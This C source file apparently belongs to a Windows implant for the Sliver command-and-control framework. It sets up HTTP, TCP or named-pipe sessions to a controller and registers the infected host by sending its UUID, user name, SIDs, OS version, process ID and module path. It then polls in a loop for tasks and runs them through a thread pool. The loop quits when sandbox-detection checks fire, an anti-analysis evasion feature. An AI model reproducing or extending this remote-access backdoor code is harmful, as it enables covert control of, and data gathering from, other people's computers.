#include "pch.h"

PSLIVER_SESSION_CLIENT SessionInit
(
	_In_ PGLOBAL_CONFIG pGlobalConfig
)
{
	PSLIVER_SESSION_CLIENT pSession = NULL;
	UINT64 uReconnectDuration = 300;
	DWORD dwPollInterval = 1.5;

	pSession = ALLOC(sizeof(SLIVER_BEACON_CLIENT));
	pSession->pGlobalConfig = pGlobalConfig;
	pSession->dwPollInterval = dwPollInterval;
	if (pGlobalConfig->Type == Session) {
		if (pGlobalConfig->Protocol == Http) {
			pSession->Init = (CLIENT_INIT)HttpInit;
			pSession->Start = HttpStart;
			pSession->Send = HttpSend;
			pSession->Receive = HttpRecv;
			pSession->Close = HttpClose;
			pSession->Cleanup = HttpCleanup;
		}
		else {
			FREE(pSession);
			pSession = NULL;
			goto CLEANUP;
		}
	}
	else if (pGlobalConfig->Type == Pivot) {
		if (pGlobalConfig->Protocol == Tcp) {
			pSession->Init = (CLIENT_INIT)TcpInit;
			pSession->Start = TcpStart;
			pSession->Send = TcpSend;
			pSession->Receive = TcpRecv;
			pSession->Close = TcpClose;
			pSession->Cleanup = TcpCleanup;
		}
		else if (pGlobalConfig->Protocol == NamedPipe) {
			pSession->Init = (CLIENT_INIT)PipeInit;
			pSession->Start = PipeStart;
			pSession->Send = PipeSend;
			pSession->Receive = PipeRecv;
			pSession->Close = PipeClose;
			pSession->Cleanup = PipeCleanup;
		}
		else {
			FREE(pSession);
			pSession = NULL;
			goto CLEANUP;
		}
	}
	else {
		FREE(pSession);
		pSession = NULL;
		goto CLEANUP;
	}

CLEANUP:
	return pSession;
}

BOOL SessionRegister
(
	_In_ PSLIVER_SESSION_CLIENT pSession
)
{
	LPSTR lpUUID = NULL;
	LPSTR lpFullQualifiedName = NULL;
	LPSTR lpUserSid = NULL;
	LPSTR lpGroupSid = NULL;
	SYSTEM_INFO SystemInfo;
	RTL_OSVERSIONINFOW OsVersion;
	LPSTR lpVersion = NULL;
	LPSTR lpHostName = NULL;
	LPSTR lpArch = NULL;
	LPSTR lpModulePath = NULL;
	DWORD cbModulePath = MAX_PATH;
	DWORD dwReturnedLength = 0;
	DWORD dwLastError = 0;
	LPSTR lpLocaleName = NULL;
	WCHAR wszLocale[0x20];
	BOOL Result = FALSE;
	CHAR szOsName[] = "windows";

	PPBElement pFinalElement = NULL;
	PPBElement ElementList[18];
	ENVELOPE RegisterEnvelope;

	SecureZeroMemory(&OsVersion, sizeof(OsVersion));
	SecureZeroMemory(&SystemInfo, sizeof(SystemInfo));
	SecureZeroMemory(ElementList, sizeof(ElementList));
	SecureZeroMemory(&RegisterEnvelope, sizeof(RegisterEnvelope));
	lpUUID = GetHostUUID();
	if (lpUUID == NULL) {
		goto CLEANUP;
	}

	lpUUID[lstrlenA(lpUUID) - 1] = '\0';
	lpFullQualifiedName = GetComputerUserName();
	if (lpFullQualifiedName == NULL) {
		goto CLEANUP;
	}

	lpUserSid = GetCurrentProcessUserSID();
	if (lpUserSid == NULL) {
		goto CLEANUP;
	}

	lpGroupSid = GetCurrentProcessGroupSID();
	if (lpGroupSid == NULL) {
		goto CLEANUP;
	}

	OsVersion.dwOSVersionInfoSize = sizeof(OsVersion);
	if (!GetOsVersion(&OsVersion)) {
		LOG_ERROR("GetOsVersion", GetLastError());
		goto CLEANUP;
	}

	GetNativeSystemInfo(&SystemInfo);
	lpVersion = ALLOC(0x100);
	wsprintfA(lpVersion, "%d build %d", OsVersion.dwMajorVersion, OsVersion.dwBuildNumber);
	if (SystemInfo.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_AMD64) {
		lstrcatA(lpVersion, " x86_64");
		lpArch = DuplicateStrA("amd64", 0);
	}
	else if (SystemInfo.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_INTEL) {
		lstrcatA(lpVersion, " x86");
		lpArch = DuplicateStrA("386", 0);
	}
	else {
		lpArch = DuplicateStrA("(NULL)", 0);
	}

	lpHostName = GetHostName();
	lpModulePath = ALLOC(cbModulePath + 1);
	while (TRUE) {
		SecureZeroMemory(lpModulePath, cbModulePath + 1);
		dwReturnedLength = GetModuleFileNameA(NULL, lpModulePath, cbModulePath);
		dwLastError = GetLastError();
		if (dwLastError == ERROR_INSUFFICIENT_BUFFER) {
			cbModulePath *= 2;
			lpModulePath = REALLOC(lpModulePath, cbModulePath + 1);
		}

		break;
	}

	GetSystemDefaultLocaleName(wszLocale, _countof(wszLocale));
	lpLocaleName = ConvertWcharToChar(wszLocale);

	ElementList[0] = CreateBytesElement(pSession->pGlobalConfig->lpSliverName, lstrlenA(pSession->pGlobalConfig->lpSliverName), 1);
	ElementList[1] = CreateBytesElement(lpHostName, lstrlenA(lpHostName), 2);
	ElementList[2] = CreateBytesElement(lpUUID + 1, lstrlenA(lpUUID + 1), 3);
	ElementList[3] = CreateBytesElement(lpFullQualifiedName, lstrlenA(lpFullQualifiedName), 4);
	ElementList[4] = CreateBytesElement(lpUserSid, lstrlenA(lpUserSid), 5);
	ElementList[5] = CreateBytesElement(lpGroupSid, lstrlenA(lpGroupSid), 6);
	ElementList[6] = CreateBytesElement(szOsName, lstrlenA(szOsName), 7);
	ElementList[7] = CreateBytesElement(lpArch, lstrlenA(lpArch), 8);
	ElementList[8] = CreateVarIntElement(GetCurrentProcessId(), 9);
	ElementList[9] = CreateBytesElement(lpModulePath, lstrlenA(lpModulePath), 10);
	ElementList[11] = CreateBytesElement(lpVersion, lstrlenA(lpVersion), 12);
	ElementList[12] = CreateVarIntElement(pSession->pGlobalConfig->dwReconnectInterval, 13);
	ElementList[15] = CreateBytesElement(pSession->pGlobalConfig->lpConfigID, lstrlenA(pSession->pGlobalConfig->lpConfigID), 16);
	ElementList[16] = CreateVarIntElement(pSession->pGlobalConfig->uPeerID, 17);
	ElementList[17] = CreateBytesElement(lpLocaleName, lstrlenA(lpLocaleName), 18);

	pFinalElement = CreateStructElement(ElementList, _countof(ElementList), 0);
	RegisterEnvelope.pData = BufferMove(pFinalElement->pMarshaledData, pFinalElement->cbMarshaledData);
	RegisterEnvelope.uType = MsgRegister;
	pFinalElement->pMarshaledData = NULL;
	Result = pSession->Send(pSession->pGlobalConfig, pSession->lpClient, &RegisterEnvelope);
CLEANUP:
	FREE(lpHostName);
	FREE(lpUUID);
	FREE(lpFullQualifiedName);
	FREE(lpUserSid);
	FREE(lpGroupSid);
	FREE(lpArch);
	FREE(lpModulePath);
	FREE(lpVersion);
	FREE(lpLocaleName);
	FreeBuffer(RegisterEnvelope.pData);
	FreeElement(pFinalElement);

	return Result;
}

VOID SessionWork
(
	_Inout_ PTP_CALLBACK_INSTANCE Instance,
	_Inout_opt_ PSESSION_WORK_WRAPPER pWrapper,
	_Inout_ PTP_WORK Work
)
{
	PENVELOPE* TaskResults = NULL;
	PSLIVER_SESSION_CLIENT pSession = NULL;
	DWORD i = 0;
	DWORD dwOldInterval = 0;
	REQUEST_HANDLER* HandlerTable = NULL;
	REQUEST_HANDLER SystemTaskHandler = NULL;
	PENVELOPE pRecvEnvelope = NULL;
	PENVELOPE pSendEnvelope = NULL;

	pRecvEnvelope = pWrapper->pEnvelope;
	HandlerTable = GetSystemHandler();
	pSession = pWrapper->pSession;
	SystemTaskHandler = HandlerTable[pRecvEnvelope->uType];
	if (SystemTaskHandler != NULL) {
		pSendEnvelope = SystemTaskHandler(pRecvEnvelope, pSession);
	}
	else {
		pSendEnvelope = ALLOC(sizeof(ENVELOPE));
		pSendEnvelope->uID = pRecvEnvelope->uID;
		pSendEnvelope->uUnknownMessageType = 1;
	}

	if (!pSession->Send(pSession->pGlobalConfig, pSession->lpClient, pSendEnvelope)) {
		goto CLEANUP;
	}

CLEANUP:
	FreeEnvelope(pSendEnvelope);
	FreeEnvelope(pRecvEnvelope);
	FREE(pWrapper);
	FREE(HandlerTable);

	return;
}

VOID SessionMainLoop
(
	_In_ PSLIVER_SESSION_CLIENT pSession
)
{
	PENVELOPE pEnvelope = NULL;
	PSLIVER_THREADPOOL pSliverPool = NULL;
	PTP_WORK pWork = NULL;
	PSESSION_WORK_WRAPPER pWrapper = NULL;
	DWORD dwNumberOfAttempts = 0;
	PGLOBAL_CONFIG pConfig = pSession->pGlobalConfig;
	DWORD i = 0;
	BOOL IsOk = FALSE;
	LPVOID* ProfileList = NULL;
	DWORD cProfiles = 0;

	pSliverPool = InitializeSliverThreadPool();
	if (pSliverPool == NULL) {
		goto CLEANUP;
	}

	if (pConfig->Protocol == Http) {
		ProfileList = pConfig->HttpProfiles;
		cProfiles = pConfig->cHttpProfiles;
	}
	else if (pConfig->Type == Pivot) {
		ProfileList = pConfig->PivotProfiles;
		cProfiles = pConfig->cPivotProfiles;
	}
	else {
		goto CLEANUP;
	}
	
	for (i = 0; i < cProfiles; i++) {
		pSession->lpClient = pSession->Init(ProfileList[i]);
#ifndef _DEBUG
		if (DetectSandbox2() || DetectSandbox3()) {
			goto CLEANUP;
		}
#endif
		if (!pSession->Start(pSession->pGlobalConfig, pSession->lpClient)) {
			goto CONTINUE;
		}
			
		if (!SessionRegister(pSession)) {
			goto CONTINUE;
		}

		dwNumberOfAttempts = 0;
		while (TRUE) {
#ifndef _DEBUG
			if (DetectSandbox1() || DetectSandbox2()) {
				goto CLEANUP;
			}
#endif
			if (dwNumberOfAttempts >= pSession->pGlobalConfig->dwMaxFailure) {
				goto CONTINUE;
			}

			pEnvelope = pSession->Receive(pSession->pGlobalConfig, pSession->lpClient);
			if (pEnvelope == NULL) {
				dwNumberOfAttempts++;
				goto SLEEP;
			}

			dwNumberOfAttempts = 0;
			if (pEnvelope->uType == 0) {
				FreeEnvelope(pEnvelope);
				goto SLEEP;
			}

			PrintFormatW(L"Receive Envelope:\n");
			HexDump(pEnvelope->pData->pBuffer, pEnvelope->pData->cbBuffer);
			pWrapper = ALLOC(sizeof(SESSION_WORK_WRAPPER));
			pWrapper->pSession = pSession;
			pWrapper->pEnvelope = pEnvelope;
			pWork = CreateThreadpoolWork((PTP_WORK_CALLBACK)SessionWork, pWrapper, &pSliverPool->CallBackEnviron);
			TpPostWork(pWork);
		SLEEP:
			Sleep(pSession->dwPollInterval * 1000);
		}

	CONTINUE:
		pSession->Close(pSession->lpClient);
		pSession->Cleanup(pSession->lpClient);
		pSession->lpClient = NULL;
	}

CLEANUP:
	FreeSliverThreadPool(pSliverPool);

	return;
}

VOID FreeSessionClient
(
	_In_ PSLIVER_SESSION_CLIENT pSession
)
{
	if (pSession != NULL) {
		if (pSession->lpClient != NULL) {
			pSession->Close(pSession->lpClient);
			pSession->Cleanup(pSession->lpClient);
		}
		
		FreeGlobalConfig(pSession->pGlobalConfig);
		FREE(pSession);
	}
}